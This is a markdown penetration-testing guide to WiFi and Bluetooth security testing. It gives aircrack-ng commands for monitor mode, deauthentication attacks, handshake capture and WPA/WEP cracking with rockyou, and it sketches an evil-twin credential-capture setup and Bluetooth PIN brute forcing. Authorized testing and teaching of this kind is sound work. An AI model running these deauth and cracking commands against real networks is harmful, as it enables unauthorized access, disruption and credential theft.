# Wireless Network Security Testing

## Overview

Wireless testing focuses on WiFi networks. The primary tool suite is `aircrack-ng`. This guide covers the full WiFi testing workflow: monitoring, capture, cracking, and reporting.

**Authorization reminder:** Only test wireless networks you own or have explicit written permission to test. Unauthorized wireless testing is illegal in most jurisdictions.

## Prerequisites

```bash
# Check wireless adapter
iwconfig
airmon-ng check kill   # Kill interfering processes

# Put adapter into monitor mode
airmon-ng start wlan0
# This creates wlan0mon interface

# Verify monitor mode
iwconfig wlan0mon
# Should show "Mode:Monitor"
```

## Stage 1: Network Discovery

```bash
# Scan for nearby networks
airodump-ng wlan0mon
# Shows: BSSID, channel, encryption, ESSID, connected clients

# Targeted scan on specific channel
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# -c: channel, --bssid: target AP, -w: output file prefix
```

## Stage 2: Capture Handshake

A WPA/WPA2 handshake capture is required for offline cracking. You need to capture the 4-way handshake when a client connects to the AP.

### Passive Method (Wait for legitimate connection)

```bash
# Start capture and wait for a client to connect
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Watch for "WPA handshake: AA:BB:CC:DD:EE:FF" in the top-right
```

### Active Method (Deauthentication attack)

```bash
# Send deauth packets to force client reconnection
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c FF:11:22:33:44:55 wlan0mon
# -0: deauth attack, 5: number of packets
# -a: AP BSSID, -c: client MAC (omit to broadcast to all clients)

# In another terminal, run airodump-ng simultaneously to capture the handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

## Stage 3: Cracking

### WPA/WPA2 Cracking

```bash
# Crack with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Crack with hashcat (faster, GPU-accelerated)
# Convert capture to hashcat format
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Crack with john
# Convert first if needed, then use john with the hash
```

### WEP Cracking (legacy, rare now)

```bash
# Capture IVs
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# ARP replay to generate traffic
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Crack once enough IVs collected (~50,000+)
aircrack-ng wep_capture-01.cap
```

## WPA3 / WPA2-SAE Testing

```bash
# WPA3 uses SAE (Simultaneous Authentication of Equals)
# Capture using hcxdumptool
hcxdumptool -i wlan0mon -o capture.pcapng --active_beacon --enable_status=3

# Convert and crack
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

## Evil Twin / Rogue AP (Advanced, Red Team)

An Evil Twin mimics a legitimate AP to capture credentials. Only use in authorized red team engagements.

```bash
# Create rogue AP with hostapd-wpe or similar tools
# This is advanced and requires careful setup

# Basic rogue AP concept:
# 1. Set up an AP with same ESSID as target
# 2. Use higher signal strength to attract clients
# 3. Capture credentials at a fake login page

# Tools for this:
# - hostapd-wpe (Rogue AP with credential capture)
# - Fluxion (automated evil twin framework)
# - Bettercap (can be used for WiFi spoofing)
```

## Bluetooth Testing

```bash
# Scan for Bluetooth devices
btscanner
bluelog

# Bluetooth service enumeration
sdptool browse XX:XX:XX:XX:XX:XX

# Bluetooth brute force (PIN)
bluetooth-pin-cracker
```

## Post-Testing Cleanup

```bash
# Stop monitor mode
airmon-ng stop wlan0mon

# Restart network manager
systemctl start NetworkManager

# Verify normal operation
iwconfig
```

## Workflow Summary

```
1. Enable monitor mode
   └─ airmon-ng start wlan0
2. Discover networks
   └─ airodump-ng wlan0mon
3. Target specific AP
   └─ airodump-ng -c CH --bssid MAC -w capture wlan0mon
4. Capture handshake
   ├─ Passive: wait for connection
   └─ Active: aireplay-ng deauth
5. Crack password
   ├─ aircrack-ng (CPU)
   └─ hashcat (GPU, faster)
6. Cleanup
   └─ airmon-ng stop, restart NetworkManager
```
